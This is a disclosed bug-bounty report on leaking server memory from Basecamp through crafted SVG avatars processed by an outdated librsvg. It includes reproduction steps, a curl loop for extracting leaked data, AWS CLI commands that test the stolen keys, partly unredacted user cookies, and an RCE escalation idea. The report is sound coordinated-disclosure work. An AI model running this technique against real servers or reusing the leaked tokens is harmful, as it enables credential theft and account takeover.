---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/information-disclosure
  - env/cloud
  - stack/aws
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2023-09-21
submitted: 2023-08-13T14:16:41.617Z
bounty_usd: 8868
votes: 248
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "neex"
source: "https://hackerone.com/reports/2107680"
title: "AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp"
---
# AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp

> **Severity:** High | **Bounty:** 8,868 USD | **Votes:** 248 | **Program:** Basecamp | **Disclosed:** 2023-09-21

- Report: [https://hackerone.com/reports/2107680](https://hackerone.com/reports/2107680)
- CWE: Information Disclosure
- Submitted: 2023-08-13T14:16:41.617Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Basecamp supports uploading SVG pictures as avatars. Apparently, they are converted via an outdated librsvg version at Basecamp's servers. This version contains a vulnerability that allows leakage of the contents of an uninitialized memory block (that is, something is malloced, never initialized, and then used to build the preview image). Since it seems to be performed in the same unix process as the general request processing, it is possible for an attacker to steal sensitive data from this process, including basecamp configs (e.g., AWS keys) and requests of random users.

## Steps to reproduce

1. First, you must generate an image that triggers the vulnerability. To do so, you will need Python installed. Download the attached program F2597505 and run it like this: `python3 rsvgeb.py gen 260x260 --format bmp zalupa.png` (exactly like this). The result will be stored in the `zalupa.png` file (which is actually an SVG). The picture contains the exploit itself and carefully chosen SVG filters that make it possible to recover the original data regardless of later conversion artifacts.
2. Second, upload the resulting image as your avatar. Login to your Basecamp account, go to your profile (click on the circle image at the top left corner, then go to "Profile, password, ███"), there use the "Change your avatar button" and select the `zalupa.png` we generated earlier. Don't forget to click on the green button "Save my changes" at the bottom of the page.
3. After the avatar update, you will see the pixel image instead of the avatar. We'll use `rsvgeb.py` again to extract the information. However, the script uses ImageMagick to extract pixel data from PNG files, so you will need it installed *locally* (at the environment where the `rsvgeb.py` is ran). `apt install imagemagick -y` should be enough on Debian and Ubuntu systems. 
4. After installing ImageMagick, you must retrieve the public link to your avatar. To do this, click on your avatar with the right mouse button, and choose "Copy image address". After that, open the copied link in a new tab to follow the redirect. The link should change from something like `████` to something like `████████`. Copy the latter one.
5. Now, you need to modify the link. Replace the `.avif` extension with `.png`, and the filename (the part right before the extension) with the string `$RANDOM$RANDOM$RANDOM$RANDOM`. After that, insert the link as the `curl` argument into the following command:

     ```
     while true; do curl "████$RANDOM$RANDOM$RANDOM$RANDOM.png?v=1" | python3 rsvgeb.py recover 260x260 - | strings -n 10 | tee -a pizda_hui_govno.txt; done
     ```

    (note how the link looks; yours should also be like this except for the user id and the signed something part).
6. Execute the command. You will see fragments of memory from some Basecamp servers that will also accumulate in `pizda_hui_govno.txt`. Sometimes you will see trash or parts of the original SVG, but sometimes you will see fascinating pieces of information. Keep the script running for some time so you will get more sensitive memory fragments (I ran it for 48+ hours). Inspect `pizda_hui_govno.txt` to check what you have.

## Impact

Given the nature of the vulnerability, the attacker does not control which kind of information she will extract. However, due to the lack of isolation between the image converter process and the main Ruby on Rails application, the extracted info might be quite sensitive.

Seemingly, the most exciting fragment I came across included AWS keys and looked like this:

```
    ███
    ██████████
    ██████
    █████████
    -----END RSA PRIVATE KEY-----

s3_backup:
  access_key_id: ██████████
  secret_access_key: █████

sns:
  access_key_id: ███████
  secret_access_key: █████

active_record_encryption:
  primary_key: █████████
  deterministic_key: █████████
  key_derivation_salt: █████

new_relic:
  license_key: ██████
```

That is, apparently, a fragment of some internal Basecamp config. Other similar configs include:

```
production_s3_primary:
  service: S3
  access_key_id: ███
  secret_access_key: █████
  region: us-east-2
  bucket: ███
  upload:
    storage_class: INTELLIGENT_TIERING

production_s3_replica:
  service: S3
  access_key_id: ████████
  secret_access_key: ███
  region: us-west-2
  bucket: ████████
  upload:
    storage_class: ONEZONE_IA
```

I've checked that the keys actually work, but have not performed any post exploitation:

```
$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████ AWS_SECRET_ACCESS_KEY=██████ aws sts get-caller-identity
{
    "UserId": "██████",
    "Account": "██████████",
    "Arn": "arn:aws:iam::██████:user/bc3-storage"
}
$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████████ AWS_SECRET_ACCESS_KEY=██████████ aws s3 ls s3://███/
                           PRE ███████/
                           PRE ████████/
                           PRE ███/
                           PRE ██████/
                           PRE █████████/
                           PRE ████/
                           PRE ███████/
                           PRE ███/
                           PRE ███/
                           PRE █████/
                           PRE █████/
                           PRE █████/
█████████ ████████ ███████
██████ ████████ ██████
██████ ████████ █████
██████████ ██████ ██████
███ █████████ ██████████
██████████ ███████ █████████
███ ███████ █████████
... snip ...
```

Another thing that I was able to extract is fragments of queries of other users, including cookies (that is a random example):

```
X_REAL_IP: █████
X_FORWARDED_FOR: ████████, ███
HOST: ████████
X_QUEUE_START: 1690786808.173
CONNECTION: close
COOKIE: █████
█████████%██████%2BVxMClK5d1rjoLKbCyFnKab9lI2lZ9sLvGW%2BT60xsygpl6syYIfVHK73km9DT98ecq0JD68OBnI9EdzLcEdmI5%2BXr%2FuOZ5BeUMoX--kvDVySR7oaYSGdHy--RU8uCFyrq8mPCjEvyX38OA%3D%3D; _csrf_token=KHczIU3KBHe%2FJjVhpFWn48FJ2vtYha4YdwUvXdypO51h5iLa4XvkjqaX0XYtzy7fOJahGGN40mfq8GMEN0v1t0SqEnfJUY%2F7CY1mVVSs9EuAFK8wF4Wrh5jA9jk4sen8KDEDXq7sjAMjdnsLLzIjL0LYLG8P8%2FsZz2BHy95JB9JTSsyPleUI--MLV2RZiAHIJrVXv%2F--rQLRhEgWWYGfXxRmqL%2B%2Frw%3D%3D; authenticity_token=████; color_scheme=none; bc3_session_verification_token=0187762ee195d9bdbb1c; bc3_identity_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCSTBqYXdFPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLmJjM19pZGVudGl0eV9pZCJ9fQ%3D%3D--957bc8a13ea3ae13b00792f0fecaa58f046a791b
ACCEPT: application/json
X_REQUESTED_WITH: XMLHttpRequest
ACCEPT_LANGUAGE: de-DE,de;q=0.9
IF_NONE_MATCH: W/"77ae6ae7dd96d1bac74baed254a6ab62"
USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
REFERER: █████
X_FETCH_TYPE: native
X_CSRF_TOKEN: ██████████
X_FORWARDED_PROTO: https
X_FORWARDED_PORT: 443
```

Also, there were some fragments of Ruby code:

```
def owner_id_before_type_cast();self.attribute_before_type_cast("owner_id");end;def organization_before_type_cast();self.attribute_before_type_cast("organization");end;def about_url_before_type_cast();self.attribute_before_type_cast("about_url");end;def client_id_before_type_cast();self.attribute_before_type_cast("client_id");end;def client_secret_before_type_cast();self.attribute_before_type_cast("client_secret");end;def redirect_uri_before_type_cast();self.attribute_before_type_cast("redirect_uri");end;def trusted_before_type_cast();self.attribute_before_type_cast("trusted");end;def scope_before_type_cast();self.attribute_before_type_cast("scope");end;def signing_secret_before_type_cast();self.attribute_before_type_cast("signing_secret");
```

## Mitigation

1. As the first and the easiest hotfix, I suggest updating the librsvg to the latest version. That will fix this particular bug.
2. Another possible quick-fix option would be to forbid uploading SVG avatars or to skip preview generation for them. Note that the previews are not generated for the SVG files anywhere except the avatars (e.g., in the "Docs & Files" section); thus, exploiting librsvg issues is impossible using these endpoints.
3. As a long-term solution, I suggest moving image preview generation to an isolated environment. If you would convert every image in another process inside a networkless docker, that would eliminate all the class of image converter-related issues.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **Report Triaged**
- **2023-08-13** @rosa: Hey ███,

Just a quick update to let you know we've shipped a quick patch implementing your suggested option 2. I can no longer reproduce the issue following your steps. Tomorrow we'll continue addressing this. 

Thanks again,
██████████
- **2023-08-14** @neex: Hello ████████,

Thank you for the fast reply. I can confirm that the fix is deployed. SVGs don't work anymore.

In case you need the full list of all aws keys present in my dumps to revoke them, here are they:

```
█████ / ███████
████ / ████
████████ / ████████
██████ / ████████
```

Of course, I won't share them anywhere and will delete all the dumps.

Later I came up with an idea how I could leverage this issue to an RCE (without using the AWS keys). Since `<base64>--<signature>` data in RoR are mostly output of `ActiveSupport::MessageVerifier` (that is, marshal + hmac), I could try to recover the signing key from the dumps and then try one of unmarshal -> RCE techniques. However, I'm not sure if this would succeed.

P.S. Sorry for reporting on Sunday, I didn't expect you will be looking at it that soon. "It Doesn’t Have to Be Crazy at Work" is one of my favorite work-related books.
- **2023-08-14** @lewispb: Hey ███████, great report, thanks. Quick question, is there a relevant CVE in librsvg (or elsewhere) we can refer to here?
- **2023-08-14** @neex: Hello @lewispb,

The core issue resides in the gdk-pixbuf (this is the library used by librsvg to parse raster image formats like BMP which is used in my exploit).

I believe - but not sure at all - that the bug in question was accidentally fixed somewhere around here in ████████: ████████. However, no CVE was assigned and no security patch was released.
- **2023-08-15** @lewispb: Thanks █████ - very helpful. Are you able to also provide us with other cookies you were able to log?
- **2023-08-15** @lewispb: Actually, perhaps you could send the entire dump of data so that we could analyze it ourselves? Depending on the size, perhaps you could upload an encrypted zip here and email the key to ████

Thanks
- **2023-08-15** @neex: Hi, 

I grepped everything that looked like cookies, the file is attached: ███████
- **2023-08-15** @lewispb: Thank you very much. We would still like to analyze the data ourselves if possible.
- **2023-08-15** @neex: Sorry @lewispb, I missed your second message. 

Here's the archive, I'll emailed you the key from ████████ several minutes ago. The file is here: ████████.
- **2023-08-15** @rosa: Hey ██████████!

Thanks for sending all this; it was very helpful. 

> P.S. Sorry for reporting on Sunday, I didn't expect you will be looking at it that soon. "It Doesn’t Have to Be Crazy at Work" is one of my favorite work-related books.

Oh, no worries at all, and glad you like the book! Normally we don't work on Sundays, that's totally true, but in this case, we decided to address it as soon as we could as it was a serious issue 😅

We're still working through updates to `librsvg` in all our servers. When we finish we'll close this as Resolved. 

We'll be also awarding a bounty shortly. 

Thanks again!
██████████
- **Bounty Awarded**
- **2023-08-16** @neex: Thank you for the bounty)
- **Report Resolved**
- **2023-08-18** @neex: Hi █████████,

Yes, I confirm I just deleted everything I had on my filesystem. However, note that I can't delete the dumps I sent you earlier since they're stored here at H1.

Thanks again for the fast and qualified handling of the issue)
- **2023-08-18** @rosa: Hi ███████,

> Yes, I confirm I just deleted everything I had on my filesystem. However, note that I can't delete the dumps I sent you earlier since they're stored here at H1.

Yes, of course. That's perfect; thanks a lot for confirming, and thanks again for the brilliant report and all your patience and help with it. 

Have a good weekend!
███████
- **Agreed On Going Public**
- **Report Became Public**
